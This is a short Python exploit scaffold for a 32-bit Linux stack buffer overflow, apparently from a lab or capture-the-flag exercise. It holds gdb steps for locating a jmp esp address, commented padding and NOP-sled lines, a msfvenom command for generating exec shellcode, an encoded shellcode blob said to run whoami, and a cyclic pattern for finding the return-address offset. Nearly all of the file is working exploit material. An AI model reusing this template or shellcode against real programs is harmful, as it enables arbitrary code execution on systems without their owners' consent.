#!/usr/bin/env python
#offset = 'A' *55 # substract 4 and uncoment 'BBBB'
#offset += 'BBBB'
'''
to get jumpesp
env - gdb
show env
unset env LINES
unset env COLUMNS
show env
show proc map
step
!repeat till see heap and stack
find \b \0x<begining of heap>, \0x<end of stack>, \0xff, \0xe4
!copy first line and make it little endian
'''
#offset += '\x59\x3b\xde\xf7'
#offset += "\x90" * 15

#  msfvenom -p linux/x86/exec CMD=<command you want to run> -b "\x00\xfe\x20\x0a\xff" -f python
# shelcode goes below


# executes whoami
who =  b""
who += b"\xbf\x46\xbc\x43\xbf\xda\xd3\xd9\x74\x24\xf4\x5e"
who += b"\x31\xc9\xb1\x0b\x31\x7e\x14\x83\xee\xfc\x03\x7e"
who += b"\x10\xa4\x49\x29\xb4\x70\x2b\xfc\xac\xe8\x66\x62"
who += b"\xb8\x0f\x10\x4b\xc9\xa7\xe1\xfb\x02\x55\x8b\x95"
who += b"\xd5\x7a\x19\x82\xe1\x7c\x9e\x52\x99\x14\xf1\x33"
who += b"\x08\x8d\x0d\xe3\x81\xc4\xef\xc6\xa6"


# take the eip to wiremask to get offset
offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"


print(offset) # + who or buf for shellcode execution
